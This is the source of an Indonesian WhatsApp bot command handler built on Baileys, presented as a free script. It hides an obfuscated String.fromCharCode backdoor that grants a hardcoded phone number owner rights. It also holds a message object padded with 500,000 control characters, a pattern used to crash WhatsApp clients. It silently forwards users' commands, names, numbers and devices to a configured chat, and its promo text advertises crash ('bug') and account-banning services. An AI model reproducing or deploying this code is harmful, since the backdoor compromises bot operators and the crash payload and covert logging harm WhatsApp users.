/*
Kenz Kang Copas🥵
Sc Free Jangan Di Jual Ya Tol

*/
process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const absenData = {}
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const cron = require('node-cron');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const ytdl = require('@vreden/youtube_scraper');
const speed = require('performance-now');
const moment = require("moment-timezone");

const nou = require("node-os-utils");
const cheerio = require('cheerio');
const didyoumean = require('didyoumean');
const photooxy = require('./system/photooxy');
const toMs = require('ms')
const similarity = require('similarity')
const threshold = 0.72 
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const { randomBytes } = require('crypto');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { antispam } = require('./system/antispam');
const { exec, spawn, execSync } = require('child_process');
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, InteractiveMessage, generateMessageIDV2 } = require('@whiskeysockets/baileys');
const Harinih = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
const { 
	CatBox, 
	fileIO, 
	pomfCDN 
} = require('./system/uploader');
const { LoadDataBase } = require('./source/message');
const listidch = JSON.parse(fs.readFileSync("./library/database/listidch.json"))
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const { pinterest, pinterest2, remini, mediafire, tiktokDl, spotifyDl } = require('./library/scraper');
//const { CatBox, pomfCDN, CDNmeitang, TelegraPh, UploadFileUgu, webp2mp4File } = require('./system/uploader');
const { mediafiree } = require('./system/mediafire');
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./library/function');


module.exports = Kenz = async (Kenz, m, chatUpdate, store) => {
	try {
await LoadDataBase(Kenz, m)
const botNumber = await Kenz.decodeJid(Kenz.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
//const prefix = ""
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : global.prefix
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const makeid = randomBytes(3).toString('hex')
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
		m.device = /^3A/.test(m.id) ? 'ios' : m.id.startsWith('3EB') ? 'web' : /^.{21}/.test(m.id) ? 'android' : /^.{18}/.test(m.id) ? 'desktop' : 'unknown';
const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const command = isPremium ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : '';
//const command = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ''
const full_args = body.replace(command, '').slice(1).trim()
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const from = m.key.remoteJid
const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
const nomore = m.sender.replace(/[^0-9]/g, '')
const tag = `@${m.sender.split('@')[0]}`
const taggc = `@${from.split('@')[0]}`
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const sender = m.key.fromMe ? (Kenz.user.id.split(':')[0]+'@s.whatsapp.net' || Kenz.user.id) : (m.key.participant || m.key.remoteJid)
const ments = (teks) => {return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]}
// FUNCTION WAKTU
let d = new Date
let gmt = new Date(0).getTime() - new Date('1 Januari 2023').getTime()
const weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
const week = d.toLocaleDateString('id', { weekday: 'long' })
const calender = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const timestampp = speed();
const latensi = speed() - timestampp
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const salam = 'Selamat '+dt.charAt(0).toUpperCase() + dt.slice(1)
const isBanned = db.users[sender] !== undefined ? db.users[sender].banned : false
const userId = m.sender
const isGroup = m.key.remoteJid.endsWith('@g.us')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
// GROUP METADATA
const groupMetadata = m.isGroup ? await Kenz.groupMetadata(m.chat) :''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter((v) => v.admin !== null).map((i) => i.id) : [] || [];
const groupOwner = m.isGroup ? groupMetadata?.owner : false;
const groups = global.db.groups[m.chat] !== undefined ? global.db.groups[m.chat] : false;
 
const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
const fsaluran = { key : {
remoteJid: `${nomore}@s.whatsapp.net`,
participant : `${nomore}@s.whatsapp.net`
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '120363314209665405@newsletter@newsletter',
    newsletterName: '',
    caption: body
}}}
// FUNCTION SALDO & DATA
const { addSaldo, minSaldo, cekSaldo, cekKoinPerak } = require("./system/deposit")
let db_saldo = JSON.parse(fs.readFileSync("./library/database/saldo.json"));
function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
const Kenzganteng = addSaldo(m.sender, 1, db_saldo)
// BATAS SALDO
//const isAntiLinkCh = m.isGroup ? db.chats[m.chat].antilinkch : false;
//const linkRegex = /https?:\/\/(whatsapp\.com\/channel\/[A-Za-z0-9]+)/; 
// PP USERR 
const isSticker = (m.type == 'stickerMessage')
var ppuser
try {
ppuser = await Kenz.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
//function onlygc
        if (!isCreator && global.onlygc && !m.isGroup && isCmd && !['chat', 'menu'].includes(command)) return
// FUNCTION SELF & BATAS COMMAND
//============== [ MESSAGE ] ================================================

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

  if (m.message && m.isGroup) {
      console.log(`\n< ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ >\n`)
     console.log(chalk.magenta(`Group Chat:`))
         console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.white(chalk.bgMagenta(new Date)), chalk.black(chalk.bgWhite(budy || m.mtype)) + '\n' + chalk.white('=> From'), chalk.blue(pushname), chalk.magenta(m.sender) + '\n' + chalk.blue('=> In'), chalk.magenta(groupName, m.chat))
        } else {
            console.log(`\n< ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ >\n`)
			console.log(chalk.magenta(`Private Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.white(chalk.bgMagenta(new Date)), chalk.black(chalk.bgWhite(budy || m.mtype)) + '\n' + chalk.white('=> From'), chalk.red(pushname), chalk.magenta(m.sender))
        }
//========= [ FAKEQUOTED ] =========
    const replyAi = async (text) => {
        try {
       //    userSession.limit -= 1;
            const theArray = [
                {
                    attrs: { biz_bot: '1' },
                    tag: "bot"
                },
                {
                    attrs: {},
                    tag: "biz"
                }
            ];
            const gen = {
                conversation: text,
                messageContextInfo: {
                    messageSecret: randomBytes(32),
supportPayload: JSON.stringify({
                        version: 1,
                        is_ai_message: true,
                        should_show_system_message: true,
                        ticket_id: "1669945700536053",
                    }),
                },
            };

            Kenz.relayMessage(m.chat, gen, {
                messageId: generateMessageIDV2(`${nomore}@s.whatsapp.net`),
                additionalNodes: theArray
            });
        } catch (error) {
            console.error("Error saat membalas:", error);
        }
    };
// REPLY WITH TROLI
const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: ppuser, surface: 200, message: 'Kenz bot', orderTitle: 'By Kenz', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
// REPLY WITH DOCUMENT
const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: 'Kenz',jpegThumbnail: ppuser}}}
//REPLY WITH VN
const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
// REPLY API

const fcall = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: body}}}
const qkontak = {
key: {
participant: `${nomore}@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${pushname}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6285183671661:6285183671661\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

const qtext = {key: {remoteJid: "status@broadcast", participant: "6285183671661@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "6285183671661@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '6285183671661@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '6285183671661@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '6285183671661@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '6285183671661@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '6285183671661@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Botz"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `6285183671661@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `6285183671661@s.whatsapp.net`}}}

const qlive = {key: {participant: '6285183671661@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}
const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }	
    const replyAii = async (text) => {
        try {
    //  userSession.limit -= 1;
            const theArray = [
                {
                    attrs: { biz_bot: '1' },
                    tag: "bot"
                },
                {
                    attrs: {},
                    tag: "biz"
                }
            ];
            const gen = {
                conversation: text,
                messageContextInfo: {
                    messageSecret: randomBytes(2),
supportPayload: JSON.stringify({
                        version: 1,
                        is_ai_message: true,
                        should_show_system_message: true,
                        ticket_id: "1669945700536053",
                    }),
                },
            };

            Kenz.relayMessage(m.chat, gen, {
                messageId: generateMessageIDV2(Kenz.user.id),
                additionalNodes: theArray
            });
        } catch (error) {
            console.error("Error saat membalas:", error);
        }
    };
    //btas
     async function totalfiturr() {
   const fitur1 = () =>{
            var mytext = fs.readFileSync("./fitur.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
   const fitur2 = () =>{
            var mytext = fs.readFileSync("./fitur.js").toString()
            var numUpper = (mytext.match(/case "/g) || []).length
            return numUpper
        }
 valvul = `${fitur1()} + ${fitur2()}`
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
let format = valvul
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
try {

let resulto = (new Function('return ' + valvul))()
if (!resulto) throw resulto
return resulto
} catch (e) {
if (e == undefined) return 
console.log("!")
}
}
const totalfitur = await totalfiturr()
//good
		async function sendQP(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
    var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
        'qp': {
            'filter': {
                'filterName': filterName,
                'parameters': parameters,
                'filterResult': filterResult,
                'clientNotSupportedConfig': clientNotSupportedConfig
            },
            'filterClause': {
                'clauseType': clauseType,
                'clauses': clauses,
                'filters': filters
            }
        }
    }), { userJid: target });

    await Kenz.relayMessage(target, qpMessage.message, { participant: { jid: target }, messageId: qpMessage.key.id });
}
        //pp
const reply = async (teks) => {
return Kenz.sendMessage(m.chat, {document: fs.readFileSync("./package.json"), mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", caption: `${teks}`,     fileName: `${botname}`,
    fileLength: 99999999999999,
    pageCount: "100",


    contextInfo: {
isForwarded: true, 
forwardingScore: 9999, 
businessMessageForwardInfo: {
bussinessName: 'memek',
businessOwnerJid: `${owner}@s.whatsapp.net` }, forwardedNewsletterMessageInfo: { newsletterName: `${botname2}`, newsletterJid: `0@newsletter`}, 
}}, {quoted: qkontak})
}
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
//ai private 
//=== Game Database ==//
if (isCmd && !isCreator){
Kenz.sendMessage(`${global.DataPc}`,{ text: `WhatsApp ${m.isGroup ? `group\n${groupMetadata.subject}` : !m.isGroup ? 'chatt' : 'gatau'}\nFrom : @${m.sender.split('@')[0]}\nChat : ${prefix+command} ${text}`,
 contextInfo: {
 mentionedJid: [m.sender],
 forwardedNewsletterMessageInfo: {
 newsletterJid: `0@newsletter`,
 newsletterName: `Kenz md`,
 serverMessageId: -1
 },
 	businessMessageForwardInfo: { businessOwnerJid: Kenz.decodeJid(Kenz.user.id)  },

 forwardingScore: 999,
 isForwarded: false,
 externalAdReply: {
 showAdAttribution: true, 
 title: `name: ${pushname}\nnomor: ${nomore}`,
 body: `device: ${m.device}`,
 thumbnailUrl: ppuser,
 sourceUrl: `${text}`,
 mediaType: 1,
 renderLargerThumbnail: false
 }
 }
 })
}
//let tebaklagu = db.game.tebaklagu = []
const onlyGroup = async() => {
let joinbang = `Hallo ${ki}${pushname}${ka}, untuk menggunakan semua fitur *Kenz*, harap masukan bot ke group anda terlebih dahulu agar anda dapat akses lebih di dalam group gratis tanpa prabayar\n\nAtau anda bisa membeli akses sewa & premium dari owner\njoin group kami: https://chat.whatsapp.com/FVlNkXGLLvXE9fkdgxviIK`
reply(joinbang)}

Kenz.sendKontol = async(chat, judul, teks, button, quot) => {
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: footer
}),
header: proto.Message.InteractiveMessage.Header.create({
title: judul,
subtitle: namaOwner,
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: button,
}),
contextInfo: {
mentionedJid: [sender], 
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: idSaluran,
newsletterName: botname,
serverMessageId: 143
}
}
})
}
}
}, {quoted: quot})

await Kenz.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
}

Kenz.enhancer = Kenz.enhancer ? Kenz.enhancer : {};
        
Kenz.autoshalat = Kenz.autoshalat ? Kenz.autoshalat : {}
    let id = m.chat
    if (id in Kenz.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        Kenz.autoshalat[id] = [
            Kenz.sendMessage(m.chat, {
audio: {
    url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
},
mimetype: 'audio/mp4',
ptt: true,
contextInfo: {
    externalAdReply: {
        showAdAttribution: true,
        mediaType: 1,
        mediaUrl: '',
        title: `Selamat menunaikan Ibadah Sholat ${sholat}`,
        body: `🕑 ${waktu}`,
        sourceUrl: '',
        thumbnail: await fs.readFileSync('./source/media/Kenz-pler.jpg'),
        renderLargerThumbnail: true
    }
}
            }, {}),
            setTimeout(async () => {
delete Kenz.autoshalat[m.chat]
            }, 57000)
        ]
    }
    }
		async function emote(emo) {
			Kenz.sendMessage(m.chat, {
				react: {
					text: emo,
					key: m.key
				}
			});
		}
        global.db.menfess = global.db.menfess ? global.db.menfess : {}
         let mf = Object.values(global.db.menfess).find(v => !v.status && v.receiver == m.sender)
         if (mf && body) {
             if (m.isGroup) return reply(`Balas Pesan Menfess Mu Di Private Chat`)
          //  if (!/conversation|extended/.test(m.mtype)) return reply(`Balas dengan teks biasa.`)
            let text = `😄 Hai kak, kamu menerima pesan balasan nih dari ${mf.receiver.split('@')[0]} pesannya : *${body}*`
            await Kenz.sendMessage(mf.from, { text: text }).then(async () => {
               m.reply(`pesan Berhasil Terkirim!!`)
               await sleep(1000)
               delete global.db.menfess[mf.id]
               return !0
            })
         }     
  Kenz.sendButton = async (jid, buttons, quoted, opts = {}) => {
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }
               }
            }
         }
      }, {
         quoted
      })
      await Kenz.sendPresenceUpdate('composing', jid)
      return Kenz.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }

//kontal
const userdb = global.db.users[m.sender]
const users = global.db.users

const listall = global.db.listall

const chats = global.db.chats
// FUNCTION ONLY PRIVATE CHAT
        if (global.onlypc) {
        	if (isCmd && m.isGroup && !isCreator && !isPremium){
	         return 
	     }
	}
//pler
		if (!isCreator && !m.key.fromMe && m.message) {
			if (budy.match(`@${global.owner}`)) {
m.reply("apa coba tag ayang ku😑")
			}
		};

//============= [ EVENT GROUP ] ===============================================
const isNumber = x => typeof x === 'number' && !isNaN(x)
try {
let user = db.users[sender]
if (user) {
if (typeof user !== 'object') db.users[sender] = {}
if (!('jid' in user)) user.jid = sender
if (!('name' in user)) user.name = pushname
if (!('date' in user)) user.date = calender
if (!isNumber(user.limit)) user.limit = 100
if (!('hitcmd' in user)) user.hitcmd = 0
if (!isNumber(user.balance)) user.balance = 10000
if (!('banned' in user)) user.banned = false
if (!('premium' in user)) user.premium = false
if (!isNumber(user.expired)) user.expired = Date.now() + toMs('7d')
} else db.users[sender] = {
jid: sender,
name: pushname,
date: calender,
limit: 100,
hitcmd: 0,
balance: 10000,
banned: false,
premium: false,
expired: Date.now() + toMs('7d')
}
} catch (err) {
console.error(err)
}
if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilinkch == true && !isCreator) return
        
if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].simi == true && !isCmd && !isSticker) {
try {
   let response = await fetch('https://api.simsimi.vn/v2/simtalk', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: new URLSearchParams({
                text: m.text,
                lc: 'id',
                key: ''
            })
        });

        let json = await response.json();
        m.reply("" + json.message);
} catch (e) {}
}        
//pler
if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await Kenz.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Kenz.sendMessage(m.chat, {text: `*乂 [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await Kenz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await Kenz.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = `https://chat.whatsapp.com/` + await groupInviteCode(m.chat);
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Kenz.sendMessage(m.chat, {text: `*乂 [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await Kenz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await Kenz.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}
        

let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`${tag} sedang *Afk* ${reason ? 'karena ' + reason : 'tanpa alasan'} selama *${clockString(new Date - afkTime)}*
`.trim())
}
if (global.db.users[sender].afkTime > -1) {
let user = global.db.users[sender]
m.reply(`${tag} telah kembali dari *Afk* ${user.afkReason ? 'setelah ' + user.afkReason : ''}\nselama *${clockString(new Date - user.afkTime)}*`.trim())
user.afkTime = -1
user.afkReason = ''
}
if ((budy.match) && ["kon", "kont", "kntl", "tolol", "tll", "pler", "woy", "mek", "jawir", "anj", "suki", "yaudah", "titit", "anjay", "mmk", "asu", "Ajg", "ajg", "kontol", "Kontol", "puki", "Puki", "yatim", "Yatim", "memek", "Memek", "asu", "Asu", "ngtd", "Ngtd"].includes(budy)) {
Kenz.sendMessage(m.chat, { audio: fs.readFileSync('./source/media/vn/toxic.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
}
if ((budy.match) && ["Assalamualaikum", "assalamualaikum", "Assalamu'alaikum", "asalamualaikum", "samlikum", "mikum", "asalamuallaikum"].includes(budy)) {
let plerKenz = `https://pomf2.lain.la/f/7ixvc40h.mp3`
Kenz.sendMessage(m.chat, {audio: {url: plerKenz}, mimetype: 'audio/mpeg', ptt: true }, { quoted: m})
}
        
if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await Kenz.sendMessage(m.chat, {text: `*Masuk Sinii Kak Bebas Promosi*

* *chat.whatsapp.com/BEAWNlvQDt5KcFJ6pzQAn2*

* *chat.whatsapp.com/BEAWNlvQDt5KcFJ6pzQAn2*

*#- Ready Panel Private & Public*

*- Panel Public 1Gb - Unli* 
*- Panel Private 1Gb - Unli*
*- Reseller Panel 5k*
*- Admin Panel 10k*
*- Partner Panel  15k*
*- Owner Panel  25k*
*[ ! ] Only Bulanan, permanen? +5k aja*
> *Nego? Bolehh Asal 🧠🧠*

*>> Produk Lainnya? <<*
*» Aplikasi Premium, YouTube, Spotify,Dll*
*» Script Bot Tele/WhatsApp*
*» Script Bug Starevxz*
*»  Sewa Bot WhatsApp, pushkontak, group, bug*
*»  Domain my.id web.id biz.id*
*»  Apitoken & Zone Domain*
*»  Jasa Rename Script*
*»  Jasa Suntik Sosmed*
*»  Jasa Install Panel*
*»  Jasa Install Thema*
*»  Jasa Bug*
*»  Murid Unband*
*»  Murid Banned*
*»  Murid Nokos*
*»  Murid Suntik*
*Dll Tanyakan saja*
> Produk Lainnya Tanyakan Saja 90% Ada


*☎️ Contact Kenz - OfficiaL*
*🪀 WhatsApp :* +6285183671661
*🎮 Telegram :* @KenzyXD
*🀄 Web Store :* https://payment-kenzyxd.vercel.app
▬▭▬▭▬▭▬▭▬▭▬▭▬
*🎴 Testimoni :*
 *- https://whatsapp.com/channel/0029Vb6M1WF1t90UFHjmpH35*
*🌀 Group Bebas Promosi :*
*- chat.whatsapp.com/BXmhQMqAxY1AJqD5nQwfoJ*
> ©  KenzyXD - Official
`}, {quoted: null})
}
}


if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
//await m.reply(check.respon)
}
}
